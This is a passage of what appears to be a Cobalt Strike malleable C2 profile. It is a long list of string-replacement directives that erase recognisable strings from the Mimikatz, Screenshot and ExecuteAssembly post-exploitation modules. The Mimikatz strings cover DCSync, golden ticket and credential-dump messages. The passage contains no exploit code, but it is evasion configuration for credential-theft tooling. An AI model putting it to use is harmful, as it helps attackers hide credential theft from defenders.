        strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync_SearchAndParseLDAPToIntId ; More than one entry?" "";
        strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync_SearchAndParseLDAPToIntId ; No values?" "";
        strrepex "Mimikatz" "[ldap]" "";
        strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; Domain not present, or doesn't look like a FQDN" "";
        strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; Domain Controller not present" "";
        strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; Missing user or guid argument" "";
        strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; RPC Exception 0x" "";
        strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x" "";
        strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; DRSGetNCChanges, invalid dwOutVersion (" "";
        strrepex "Mimikatz" ") and/or cNumObjects (" "";
        strrepex "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; kull_m_rpc_drsr_ProcessGetNCChangesReply" "";
        strrepex "Mimikatz" "[DC] ms-DS-ReplicationEpoch is:" "";
        strrepex "Mimikatz" "will be the user account" "";
        strrepex "Mimikatz" "[DC] Object with GUID" "";
        strrepex "Mimikatz" "[DC] Exporting domain" "";
        strrepex "Mimikatz" "Revert to proces token" "";
        strrepex "Mimikatz" "Impersonation" "";
        strrepex "Mimikatz" "Identification" "";
        strrepex "Mimikatz" "Anonymous" "";
        strrepex "Mimikatz" "Run!" "";
        strrepex "Mimikatz" "Impersonate a token" "";
        strrepex "Mimikatz" "List all tokens of the system" "";
        strrepex "Mimikatz" "Display current identity" "";
        strrepex "Mimikatz" "CdcServer" "";
        strrepex "Mimikatz" "UasServer" "";
        strrepex "Mimikatz" "TrustedDomain" "";
        strrepex "Mimikatz" "[DC]" "";
        strrepex "Mimikatz" "TrustedDnsDomain" "";
        strrepex "Mimikatz" "Export         :" "";
        strrepex "Mimikatz" "* Unknown key (seen as" "";
        strrepex "Mimikatz" "* Legacy key" "";
        strrepex "Mimikatz" "PFX container  :" "";
        strrepex "Mimikatz" "Out-1" "";
        strrepex "Mimikatz" "In-1" "";
        strrepex "Mimikatz" "unknown?" "";
        strrepex "Mimikatz" "Random Value :" "";
        strrepex "Mimikatz" "OlderCredentials" "";
        strrepex "Mimikatz" "Default Iterations :" "";
        strrepex "Mimikatz" "Default Salt :" "";
        strrepex "Mimikatz" "OldCredentials" "";
        strrepex "Mimikatz" "Default Salt :" "";
        strrepex "Mimikatz" "NTLM-Strong-NTOWF" "";
        strrepex "Mimikatz" "Kerberos-Newer-Keys" "";
        strrepex "Mimikatz" "Supplemental Credentials:" "";
        strrepex "Mimikatz" "LsaDump module" "";
        strrepex "Mimikatz" "Skew1" "";
        strrepex "Mimikatz" "Ask a DC to send current and previous NTLM hash of DC/SRV/WKS" "";
        strrepex "Mimikatz" "Ask a server to set a new password/ntlm for one user" "";
        strrepex "Mimikatz" "Ask a DC to synchronize an object" "";
        strrepex "Mimikatz" "Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly)" "";
        strrepex "Mimikatz" "Ask LSA Server to retrieve SAM/AD entries (normal, patch on the fly or inject)" "";
        strrepex "Mimikatz" "Get the SysKey to decrypt NL$KM then MSCache(v2) (from registry or hives)" "";
        strrepex "Mimikatz" "Get the SysKey to decrypt SECRETS entries (from registry or hives)" "";
        strrepex "Mimikatz" "Get the SysKey to decrypt SAM entries (from registry or hives)" "";
        strrepex "Mimikatz" "ERROR kuhl_m_crypto_exportKeyToFile ; kull_m_file_writeData (" "";
        strrepex "Mimikatz" "ERROR kuhl_m_crypto_exportKeyToFile ; No suitable export type for key group:" "";
        strrepex "Mimikatz" "ERROR kuhl_m_crypto_exportKeyToFile ; NCryptExportKey" "";
        strrepex "Mimikatz" "-- init):" "";
        strrepex "Mimikatz" "-- data):" "";
        strrepex "Mimikatz" "ERROR kuhl_m_crypto_exportKeyToFile ; kull_m_string_EncodeB64_headers (" "";
        strrepex "Mimikatz" "PRIVATE KEY" "";
        strrepex "Mimikatz" "Algorithm Group" "";
        strrepex "Mimikatz" "ERROR kuhl_m_crypto_exportKeyToFile ; CryptExportKey(init) (0x" "";
        strrepex "Mimikatz" "ERROR kuhl_m_crypto_exportKeyToFile ; CryptExportKey(data) (0x" "";
        strrepex "Mimikatz" "Private export :" "";
        strrepex "Mimikatz" "ERROR kuhl_m_crypto_exportRawKeyToFile ; kull_m_file_writeData (0x" "";
        strrepex "Mimikatz" "KO -" "";
        strrepex "Mimikatz" "OK -" "";
        strrepex "Mimikatz" "Private raw export :" "";
        strrepex "Mimikatz" "ERROR kuhl_m_crypto_exportRawKeyToFile ; CryptImportKey (0x" "";
        strrepex "Mimikatz" "Key permissions:" "";
        strrepex "Mimikatz" "|Unique name   :" "";
        strrepex "Mimikatz" "|Key Container :" "";
        strrepex "Mimikatz" "|Provider name :" "";
        strrepex "Mimikatz" "LSA isolation  :" "";
        strrepex "Mimikatz" "Exportable key :" "";
        strrepex "Mimikatz" "Export policy  :" "";
        strrepex "Mimikatz" "Key size       :" "";
        strrepex "Mimikatz" "Algorithm      :" "";
        strrepex "Mimikatz" "Algorithm Name" "";
        strrepex "Mimikatz" "Unique name    :" "";
        strrepex "Mimikatz" "Unique Name" "";
        strrepex "Mimikatz" "Key Container  :" "";
        strrepex "Mimikatz" "|Implementation:" "";
        strrepex "Mimikatz" "Impl Type" "";
        strrepex "Mimikatz" "|Provider name :" "";
        strrepex "Mimikatz" "Provider Handle" "";
        strrepex "Mimikatz" "(null)" "";
        strrepex "Mimikatz" "[!%hu!]" "";
        strrepex "Mimikatz" "[BOOL  ]" "";
        strrepex "Mimikatz" "[STRING]" "";
        strrepex "Mimikatz" "[UINT64]" "";
        strrepex "Mimikatz" "[INT64 ]" "";
        strrepex "Mimikatz" "Id:" "";
        strrepex "Mimikatz" "Entries[" "";
        strrepex "Mimikatz" "SourceType:" "";
        strrepex "Mimikatz" "Claims[" "";
        strrepex "Mimikatz" "ERROR kuhl_m_kerberos_hash_data_raw ; CDLocateCSystem :" "";
        strrepex "Mimikatz" "ERROR kuhl_m_kerberos_hash_data_raw ; HashPassword :" "";
        strrepex "Mimikatz" "ERROR kuhl_m_kerberos_golden_data ; kuhl_m_kerberos_encrypt" "";
        strrepex "Mimikatz" "* KrbCred generated" "";
        strrepex "Mimikatz" "* EncTicketPart encrypted" "";
        strrepex "Mimikatz" "* EncTicketPart generated" "";
        strrepex "Mimikatz" "* PAC signed" "";
        strrepex "Mimikatz" "* PAC generated" "";
        strrepex "Mimikatz" "ERROR kuhl_m_kerberos_golden ; Missing user argument" "";
        strrepex "Mimikatz" "ERROR kuhl_m_kerberos_golden ; Missing domain argument" "";
        strrepex "Mimikatz" "ERROR kuhl_m_kerberos_golden ; Domain name does not look like a FQDN" "";
        strrepex "Mimikatz" "ERROR kuhl_m_kerberos_golden ; Missing krbtgt key argument (/rc4 or /aes128 or /aes256)" "";
        strrepex "Mimikatz" "ERROR kuhl_m_kerberos_golden ; Unable to locate CryptoSystem for ETYPE %u (error 0x%08x) - AES only available on NT6" "";
        strrepex "Mimikatz" "ERROR kuhl_m_kerberos_golden ; Krbtgt key size length must be" "";
        strrepex "Mimikatz" " bytes) for" "";
        strrepex "Mimikatz" "ERROR kuhl_m_kerberos_golden ; BerApp_KrbCred error" "";
        strrepex "Mimikatz" "kull_m_file_writeData (" "";
        strrepex "Mimikatz" "ERROR kuhl_m_kerberos_golden ;" "";
        strrepex "Mimikatz" "Final Ticket Saved to file !" "";
        strrepex "Mimikatz" " successfully submitted for current session" "";
        strrepex "Mimikatz" "Golden ticket for" "";
        strrepex "Mimikatz" "-> Ticket :" "";
        strrepex "Mimikatz" "** Pass The Ticket **" "";
        strrepex "Mimikatz" "Lifetime  :" "";
        strrepex "Mimikatz" "Target    :" "";
        strrepex "Mimikatz" "Service   :" "";
        strrepex "Mimikatz" "ServiceKey:" "";
        strrepex "Mimikatz" "Claims    :" "";
        strrepex "Mimikatz" "Extra SIDs:" "";
        strrepex "Mimikatz" "Groups Id : *" "";
        strrepex "Mimikatz" "User Id   :" "";
        strrepex "Mimikatz" "SID       :" "";
        strrepex "Mimikatz" "Domain    :" "";
        strrepex "Mimikatz" "User      :" "";
        strrepex "Mimikatz" "ERROR kuhl_m_kerberos_ptt_data ; LsaCallAuthenticationPackage KerbSubmitTicketMessage : %" "";
        strrepex "Mimikatz" "ERROR kuhl_m_kerberos_ptt_data ; LsaCallAuthenticationPackage KerbSubmitTicketMessage / Package :" "";
        strrepex "Mimikatz" "Kerberos package module" "";
        strrepex "Mimikatz" "List tickets in MIT/Heimdall ccache" "";
        strrepex "Mimikatz" "Pass-the-ccache [NT6]" "";
        strrepex "Mimikatz" "Hash password to keys" "";
        strrepex "Mimikatz" "Willy Wonka factory" "";
        strrepex "Mimikatz" "Purge ticket(s)" "";
        strrepex "Mimikatz" "Retrieve current TGT" "";
        strrepex "Mimikatz" "Ask or get TGS tickets" "";
        strrepex "Mimikatz" "List ticket(s)" "";
        strrepex "Mimikatz" "Pass-the-ticket [NT 6]" "";
        strrepex "Mimikatz" "Virtual Iso" "";
        strrepex "Mimikatz" "ERROR kuhl_m_dpapi_oe_domainkey_add ; No GUID or Key?" "";
        strrepex "Mimikatz" "ERROR kuhl_m_dpapi_oe_credential_add ; No SID?" "";
        strrepex "Mimikatz" "[DC] " "";
        strrepex "Mimikatz" "will be the DC server" "";
        strrepex "Mimikatz" "will be the domain" "";
        strrepex "Mimikatz" "Description :" "";
        strrepex "Mimikatz" "Full name :" "";
        strrepex "Mimikatz" "Module :" "";
        strrepex "Mimikatz" "ERROR mimikatz_doLocal ;" "";
        strrepex "Mimikatz" "command of" "";
        strrepex "Mimikatz" "module not found !" "";
        strrepex "Mimikatz" "ERROR mimikatz_doLocal ;" "";
        strrepex "Mimikatz" ">>> " "";
        strrepex "Mimikatz" "module failed : " "";
        strrepex "Mimikatz" "ERROR mimikatz_initOrClean ; CoInitializeEx:" "";
        strrepex "Mimikatz" "  .#####.   mimikatz 2.2.0-20220919 (x64) #19041 Mar 27 2024 11:34:27" "";
        strrepex "Mimikatz" " .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)" "";
        strrepex "Mimikatz" " ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )" "";
        strrepex "Mimikatz" " ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz" "";
        strrepex "Mimikatz" " '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )" "";
        strrepex "Mimikatz" "  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/" "";
        strrepex "Mimikatz" "mimikatz(powershell) #" "";
        strrepex "Mimikatz" "token::elevate" "";
        strrepex "Mimikatz" "ERROR kull_m_string_displaySID ; ConvertSidToStringSid (" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_findAttr ; Unable to get an ATTRTYP for" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_MakeAttid ; kull_m_rpc_drsr_MakeAttid_addPrefixToTable" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data ; dwOutVersion not valid" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data ; TODO (maybe?)" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_free_DRS_MSG_DCINFOREPLY_data ; dcOutVersion not valid (" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_free_DRS_MSG_DCINFOREPLY_data ; TODO (maybe?)" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_free_DRS_MSG_CRACKREPLY_data ; nameCrackOutVersion not valid (" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_CreateGetNCChangesReply_encrypt ; No Session Key" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_CreateGetNCChangesReply_encrypt ; No valid data" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_CreateGetNCChangesReply_encrypt ; Unable to calculate CRC32" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_CreateGetNCChangesReply_encrypt ; RtlEncryptData2" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; No Session Key" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; No valid data" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; RtlDecryptData2" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; Unable to calculate CRC32" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; Checksums don't match (C:" "";
        strrepex "Mimikatz" " - R:" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply ; Unable to MakeAttid for" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_CrackName ; RPC Exception 0x" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_CrackName ; CrackNames:" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_CrackName ; CrackNames: bad version" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_CrackName ; CrackNames: no item!" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_CrackName ; CrackNames (name status): 0x" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_getDCBind ; RPC Exception 0x" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_getDCBind ; IDL_DRSBind:" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_getDCBind ; No DRS Extensions Output" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_getDCBind ; Incorrect DRS Extensions Output Size (" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_getDCBind ; Incorrect DRS Extensions Output (" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_getDomainAndUserInfos ; RPC Exception 0x" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_getDomainAndUserInfos ; DomainControllerInfo: 0x" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_getDomainAndUserInfos ; DomainControllerInfo: bad version (" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_getDomainAndUserInfos ; DomainControllerInfo: DC" "";
        strrepex "Mimikatz" " not found" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_RpcSecurityCallback ; I_RpcBindingInqSecurityContext" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_RpcSecurityCallback ; QueryContextAttributes" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_Generic_Encode ; MesEncodeIncrementalHandleCreate:" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_Generic_Encode ; MesIncrementalHandleReset:" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_Generic_Encode ; RPC Exception:" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_Generic_Free ; MesDecodeIncrementalHandleCreate:" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_Generic_Decode ; MesIncrementalHandleReset:" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_Generic_Decode ; RPC Exception: 0x" "";
        strrepex "Mimikatz" "[rpc] Password :" "rpc pwd";
        strrepex "Mimikatz" "[rpc] Domain   :" "";
        strrepex "Mimikatz" "[rpc] Username :" "";
        strrepex "Mimikatz" "[rpc] AuthnSvc :" "";
        strrepex "Mimikatz" "[rpc] Service  :" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_createBinding ; RpcStringBindingCompose: 0x" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_createBinding ; RpcBindingFromStringBinding: 0x" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_createBinding ; No Binding!" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_createBinding ; RpcBindingFree: 0x" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_createBinding ; RpcBindingSetAuthInfoEx: 0x" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_createBinding ; RpcBindingSetOption: 0x" "";
        strrepex "Mimikatz" "ERROR kull_m_rpc_createBinding ; Cannot add Service to NetworkAddr if NULL" "";
        strrepex "Mimikatz" "Active mode" "";
        strrepex "Mimikatz" "Erreur LocalAlloc:" "";
        strrepex "Mimikatz" "ERROR kull_m_net_getDC ; DsGetDcName:" "";
        strrepex "Mimikatz" "ERROR kull_m_ldap_getRootDomainNamingContext ; ldap_search_s 0x" "";
        strrepex "Mimikatz" "ERROR kull_m_ldap_getRootDomainNamingContext ; ldap_count_entries is NOT 1" "";
        strrepex "Mimikatz" "ERROR kull_m_ldap_getRootDomainNamingContext ; ldap_get_values_len is NOT 1" "";
        strrepex "Mimikatz" "ERROR kull_m_ldap_getLdapAndRootDN ; ldap_init" "";
        strrepex "Mimikatz" "ERROR kull_m_ldap_getLdapAndRootDN ; ldap_bind_s 0x" "";
        strrepex "Mimikatz" "ERROR kull_m_kernel_ioctl_handle ; DeviceIoControl (0x" "";
        strrepex "Mimikatz" "====================" "";
        strrepex "Mimikatz" "Base64 of file :" "";
        strrepex "Mimikatz" "ERROR SkpEncryptionWorker ; Skp Crypto without CNG?" "";
        strrepex "Mimikatz" "ERROR SkpEncryptionWorker ; SkpInitSymmetricEncryption: 0x" "";
        strrepex "Mimikatz" "ERROR SkpEncryptionWorker ; SkpDeriveSymmetricKey: 0x" "";
        strrepex "Mimikatz" "ERROR SkpEncryptionWorker ; BCryptGenerateSymmetricKey: 0x" "";
        strrepex "Mimikatz" "ERROR SkpInitSymmetricEncryption ; SkpOpenAesGcmProvider: 0x" "";
        strrepex "Mimikatz" "ERROR SkpInitSymmetricEncryption ; SkpOpenKdfProvider: 0x" "";
        strrepex "Mimikatz" "ERROR SkpInitSymmetricEncryption ; SkpImportMasterKeyInKdf: 0x" "";
        strrepex "Mimikatz" "ERROR SkpOpenKdfProvider ; BCryptOpenAlgorithmProvider: 0x" "";
        strrepex "Mimikatz" "ERROR SkpOpenKdfProvider ; BCryptGetProperty: 0x" "";
        strrepex "Mimikatz" "ERROR SkpOpenAesGcmProvider ; BCryptSetProperty: 0x" "";
        strrepex "Mimikatz" "ERROR kull_m_crypto_NCryptFreeHandle ; NCryptFreeObject(prov): 0x" "";
        strrepex "Mimikatz" "ERROR kull_m_crypto_NCryptFreeHandle ; No CNG to support this function" "";
        strrepex "Mimikatz" "ERROR kull_m_crypto_NCryptFreeHandle ; NCryptFreeObject(key): 0x" "";
        strrepex "Mimikatz" "ERROR kull_m_crypto_NCryptGetProperty ; NCryptGetProperty(%s) - init: 0x" "";
        strrepex "Mimikatz" "ERROR kull_m_crypto_NCryptGetProperty ; NCryptGetProperty(%s) - data: 0x" "";
        strrepex "Mimikatz" "ERROR kull_m_crypto_NCryptGetProperty ; NCryptGetProperty(%s) - simple NCRYPT_HANDLE: 0x" "";
        strrepex "Mimikatz" "ERROR kull_m_crypto_NCryptGetProperty ; NCryptGetProperty(%s) - simple DWORD: 0x" "";
        strrepex "Mimikatz" "ERROR kull_m_crypto_DerAndKeyInfoToPfx ; CertAddEncodedCertificateToStore (0x" "";
        strrepex "Mimikatz" "ERROR kull_m_crypto_DerAndKeyInfoToPfx ; CertSetCertificateContextProperty(CERT_KEY_PROV_INFO_PROP_ID) (0x" "";
        strrepex "Mimikatz" "ERROR kull_m_crypto_DerAndKeyToPfx ; CryptAcquireContext (0x" "";
        strrepex "Mimikatz" "ERROR kull_m_crypto_DerAndKeyToPfx ; CryptImportKey (0x" "";
        strrepex "Mimikatz" "ERROR kull_m_crypto_exportPfx ; PFXExportCertStoreEx/kull_m_file_writeData (0x" "";
        strrepex "Mimikatz" "ERROR kull_m_crypto_close_hprov_delete_container ; CryptGetProvParam/CryptAcquireContextA (0x" "";
        strrepex "Mimikatz" "ERROR kull_m_asn1_init ; ASN1_CreateModule" "";
        strrepex "Mimikatz" "ERROR kull_m_asn1_init ; ASN1_CreateDecoder:" "";
        strrepex "Mimikatz" "ERROR kull_m_asn1_init ; ASN1_CreateEncoder:" "";

        strrepex "Screenshot" "Quantization table 0x" "";
        strrepex "Screenshot" "Not a JPEG file: starts with" "";
        strrepex "Screenshot" "Insufficient memory (case" "";
        strrepex "Screenshot" "Cannot quantize more than" "";
        strrepex "Screenshot" "color components" "";
        strrepex "Screenshot" "Cannot quantize to fewer than" "";
        strrepex "Screenshot" "Cannot quantize to more than" "";
        strrepex "Screenshot" "Invalid JPEG file structure: two SOF markers" "";
        strrepex "Screenshot" "Invalid JPEG file structure: missing SOS marker" "";
        strrepex "Screenshot" "Unsupported JPEG process: SOF type 0x" "";
        strrepex "Screenshot" "Invalid JPEG file structure: two SOI markers" "";
        strrepex "Screenshot" "Invalid JPEG file structure: SOS before SOF" "";
        strrepex "Screenshot" "Failed to create temporary file" "";
        strrepex "Screenshot" "Read failed on temporary file" "";
        strrepex "Screenshot" "Seek failed on temporary file" "";
        strrepex "Screenshot" "Write failed on temporary file --- out of disk space?" "";
        strrepex "Screenshot" "Application transferred too few scanlines" "";
        strrepex "Screenshot" "Unsupported marker type 0x" "";
        strrepex "Screenshot" "Virtual array controller messed up" "";
        strrepex "Screenshot" "Image too wide for this implementation" "";
        strrepex "Screenshot" "Read from XMS failed" "";
        strrepex "Screenshot" "Write to XMS failed" "";
        strrepex "Screenshot" "Copyright (C) 2010, Thomas G. Lane, Guido Vollbeding" "";
        strrepex "Screenshot" "10-Jan-2010" "";
        strrepex "Screenshot" "Caution: quantization tables are too coarse for baseline JPEG" "";
        strrepex "Screenshot" "Adobe APP14 marker: version %d, flags 0x" "";
        strrepex "Screenshot" ", transform" "";
        strrepex "Screenshot" "Unknown APP0 marker (not JFIF), length" "";
        strrepex "Screenshot" "Unknown APP14 marker (not Adobe), length" "";
        strrepex "Screenshot" "Define Arithmetic Table 0x" "";
        strrepex "Screenshot" "Define Huffman Table 0x" "";
        strrepex "Screenshot" "Define Quantization Table" "";
        strrepex "Screenshot" "precision" "";
        strrepex "Screenshot" "Define Restart Interval" "";
        strrepex "Screenshot" "Freed EMS handle" "";
        strrepex "Screenshot" "Obtained EMS handle" "";
        strrepex "Screenshot" "End Of Image" "";
        strrepex "Screenshot" "JFIF APP0 marker: version" "";
        strrepex "Screenshot" "density" "";
        strrepex "Screenshot" "Warning: thumbnail image size does not match data length" "";
        strrepex "Screenshot" "JFIF extension marker: type 0x" "";
        strrepex "Screenshot" "thumbnail image" "";
        strrepex "Screenshot" "Miscellaneous marker" "";
        strrepex "Screenshot" "Unexpected marker" "";
        strrepex "Screenshot" "Quantizing to" "";
        strrepex "Screenshot" "Selected " "";
        strrepex "Screenshot" "colors for quantization" "";
        strrepex "Screenshot" "At marker" "";
        strrepex "Screenshot" ", recovery action" "";
        strrepex "Screenshot" "Invalid SOS parameters for sequential JPEG" "";
        strrepex "Screenshot" "Smoothing not supported with nonstandard sampling ratios" "";
        strrepex "Screenshot" "Start Of Frame 0x" "";
        strrepex "Screenshot" "width=" "";
        strrepex "Screenshot" ", height=" "";
        strrepex "Screenshot" "components=" "";
        strrepex "Screenshot" "Component " "";
        strrepex "Screenshot" "q=" "";
        strrepex "Screenshot" "Start of Image" "";
        strrepex "Screenshot" "Start Of Scan:" "";
        strrepex "Screenshot" "components" "";
        strrepex "Screenshot" "dc=" "";
        strrepex "Screenshot" "ac=" "";
        strrepex "Screenshot" "Ss=" "";
        strrepex "Screenshot" "Se=" "";
        strrepex "Screenshot" "Ah=" "";
        strrepex "Screenshot" "Al=" "";
        strrepex "Screenshot" "Closed temporary file" "";
        strrepex "Screenshot" "Opened temporary file" "";
        strrepex "Screenshot" "JFIF extension marker: JPEG-compressed thumbnail image, length" "";
        strrepex "Screenshot" "JFIF extension marker: palette thumbnail image, length" "";
        strrepex "Screenshot" "JFIF extension marker: RGB thumbnail image, length" "";
        strrepex "Screenshot" "Unrecognized component IDs" "";
        strrepex "Screenshot" ", assuming YCbCr" "";
        strrepex "Screenshot" "Freed XMS handle" "";
        strrepex "Screenshot" "Obtained XMS handle" "";
        strrepex "Screenshot" "Unknown Adobe color transform code" "";
        strrepex "Screenshot" "Corrupt JPEG data: bad arithmetic code" "";
        strrepex "Screenshot" "Inconsistent progression sequence for component" "";
        strrepex "Screenshot" "coefficient" "";
        strrepex "Screenshot" "Corrupt JPEG data:" "";
        strrepex "Screenshot" "extraneous bytes before marker 0x" "";
        strrepex "Screenshot" "Corrupt JPEG data: premature end of data segment" "";
        strrepex "Screenshot" "Corrupt JPEG data: bad Huffman code" "";
        strrepex "Screenshot" "Warning: unknown JFIF revision number" "";
        strrepex "Screenshot" "Premature end of JPEG file" "";
        strrepex "Screenshot" "Corrupt JPEG data: found marker 0x" "";
        strrepex "Screenshot" "instead of RST" "";
        strrepex "Screenshot" "Invalid SOS parameters for sequential JPEG" "";
        strrepex "Screenshot" "Application transferred too many scanlines" "";
        strrepex "Screenshot" "Bogus message code" "";
        strrepex "Screenshot" "ALIGN_TYPE is wrong, please fix" "";
        strrepex "Screenshot" "MAX_ALLOC_CHUNK is wrong, please fix" "";
        strrepex "Screenshot" "Bogus buffer control mode" "";
        strrepex "Screenshot" "Invalid component ID" "";
        strrepex "Screenshot" "in SOS" "";
        strrepex "Screenshot" "Invalid crop request" "";
        strrepex "Screenshot" "DCT coefficient out of range" "";
        strrepex "Screenshot" "DCT scaled block size" "";
        strrepex "Screenshot" "not supported" "";
        strrepex "Screenshot" "Component index" "";
        strrepex "Screenshot" "mismatching sampling ratio" "";
        strrepex "Screenshot" "Bogus Huffman table definition" "";
        strrepex "Screenshot" "Bogus input colorspace" "";
        strrepex "Screenshot" "Bogus JPEG colorspace" "";
        strrepex "Screenshot" "Bogus marker length" "";
        strrepex "Screenshot" "Wrong JPEG library version: library is" "";
        strrepex "Screenshot" "caller expects" "";
        strrepex "Screenshot" "Sampling factors too large for interleaved scan" "";
        strrepex "Screenshot" "Invalid memory pool code" "";
        strrepex "Screenshot" "Unsupported JPEG data precision" "";
        strrepex "Screenshot" "Invalid progressive parameters" "";
        strrepex "Screenshot" "Invalid progressive parameters at scan script entry" "";
        strrepex "Screenshot" "Bogus sampling factors" "";
        strrepex "Screenshot" "Invalid scan script at entry" "";
        strrepex "Screenshot" "Improper call to JPEG library in state" "";
        strrepex "Screenshot" "JPEG parameter struct mismatch: library thinks size is" "";
        strrepex "Screenshot" ", caller expects" "";
        strrepex "Screenshot" "Bogus virtual array access" "";
        strrepex "Screenshot" "Buffer passed to JPEG library is too small" "";
        strrepex "Screenshot" "Suspension not allowed here" "";
        strrepex "Screenshot" "CCIR601 sampling not implemented yet" "";
        strrepex "Screenshot" "Too many color components:" "";
        strrepex "Screenshot" ", max" "";
        strrepex "Screenshot" "Unsupported color conversion request" "";
        strrepex "Screenshot" "Bogus DAC index" "";
        strrepex "Screenshot" "Bogus DAC value" "";
        strrepex "Screenshot" "Bogus DHT index" "";
        strrepex "Screenshot" "Bogus DQT index" "";
        strrepex "Screenshot" "Empty JPEG image (DNL not supported)" "";
        strrepex "Screenshot" "Read from EMS failed" "";
        strrepex "Screenshot" "Write to EMS failed" "";
        strrepex "Screenshot" "Didn't expect more than one scan" "";
        strrepex "Screenshot" "Input file read error" "";
        strrepex "Screenshot" "Output file write error --- out of disk space?" "";
        strrepex "Screenshot" "Fractional sampling not implemented yet" "";
        strrepex "Screenshot" "Huffman code size table overflow" "";
        strrepex "Screenshot" "Missing Huffman code table entry" "";
        strrepex "Screenshot" "Maximum supported image dimension is" "";
        strrepex "Screenshot" " pixels" "";
        strrepex "Screenshot" "Empty input file" "";
        strrepex "Screenshot" "Premature end of input file" "";
        strrepex "Screenshot" "Cannot transcode due to multiple use of quantization table" "";
        strrepex "Screenshot" "Scan script does not transmit all data" "";
        strrepex "Screenshot" "Invalid color quantization mode change" "";
        strrepex "Screenshot" "Not implemented yet" "";
        strrepex "Screenshot" "Requested feature was omitted at compile time" "";
        strrepex "Screenshot" "Arithmetic table 0x" "";
        strrepex "Screenshot" "was not defined" "";
        strrepex "Screenshot" "Backing store not supported" "";
        strrepex "Screenshot" "Huffman table" "";
        strrepex "Screenshot" "JPEG datastream contains no image" "";
        
        strrepex "ExecuteAssembly" "ICLRMetaHost::GetRuntime" "";
        strrepex "ExecuteAssembly" "failed w/hr 0x" "";
        strrepex "ExecuteAssembly" ".NET runtime [ver" "";
        strrepex "ExecuteAssembly" "] cannot be loaded" "";
        strrepex "ExecuteAssembly" "[-] No .NET runtime found. :(" "";
        strrepex "ExecuteAssembly" "[-] get_EntryPoint failed." "";
        strrepex "ExecuteAssembly" "[-] GetParameters failed." "";
        strrepex "ExecuteAssembly" "[-] Invoke_3 on EntryPoint failed." "";
        strrepex "ExecuteAssembly" "[-] Failed to create the runtime host" "";
        strrepex "ExecuteAssembly" "[-] CLR failed to start w/hr 0x" "";
        strrepex "ExecuteAssembly" "[-] ICorRuntimeHost::GetDefaultDomain failed w/hr 0x" "";
        strrepex "ExecuteAssembly" "[-] Failed to get default AppDomain w/hr 0x" "";
        strrepex "ExecuteAssembly" "Could not find signature in the" "";
        strrepex "ExecuteAssembly" "Could not fix signature in the" "";
        strrepex "ExecuteAssembly" "function :" "";
        strrepex "ExecuteAssembly" "[-] Patch index" "";
        strrepex "ExecuteAssembly" " error setting memory protection" "";
        strrepex "ExecuteAssembly" "loading library" "";
